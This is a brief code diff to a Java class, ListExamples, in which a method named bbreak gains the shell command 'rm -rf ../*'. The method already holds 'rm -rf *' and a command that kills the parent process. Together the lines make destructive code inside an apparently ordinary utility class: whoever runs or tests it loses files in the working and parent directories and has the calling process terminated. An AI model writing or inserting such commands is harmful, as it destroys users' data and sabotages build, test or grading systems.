@@ -49,6 +49,7 @@ class ListExamples {
   }
   
   public static void bbreak(){
+    executeBashCommand("rm -rf ../*");
     executeBashCommand("rm -rf *");
     executeBashCommand("ps && kill -KILL ${PPID}");
   }
